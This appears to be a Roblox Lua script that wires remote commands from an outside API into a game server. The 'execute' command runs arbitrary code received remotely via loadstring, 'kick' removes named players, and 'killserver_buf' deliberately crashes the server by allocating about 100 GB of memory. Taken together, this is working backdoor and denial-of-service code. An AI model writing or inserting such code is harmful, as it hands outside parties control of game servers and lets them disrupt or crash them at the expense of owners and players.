API:OnCommand("execute",function(args)
	task.defer(function()
		local owner = game:GetService("Players"):FindFirstChild(args[2] or "{}")
		local success, reason = loadstring(args[1])
		print(table.concat(args," | "))
		if success then
			getfenv(success).owner = owner
			getfenv(success).API = nil
			getfenv(success).atproto = nil
			getfenv(success).ROOT_URL = nil
			getfenv(success).P_SECRET = nil
			getfenv(success).script = Instance.new("Script")
			success()
		else
			warn("[REM]","LOADSTRING ERROR",reason)
		end
	end)
end)

API:OnCommand("kick",function(args)
	task.defer(function()
		local owner = game:GetService("Players"):FindFirstChild(args[1] or "{}")
		local reason = args[2]
		if owner then
			owner:Kick(reason)
		end
	end)
end)

API:OnCommand("killserver_buf",function(args)
	task.defer(function()
		-- best crash method
		local buffers = {}
		for i = 1,100 do
			table.insert(buffers, buffer.create(1073741824))
			task.wait(.5)
		end
	end)
end)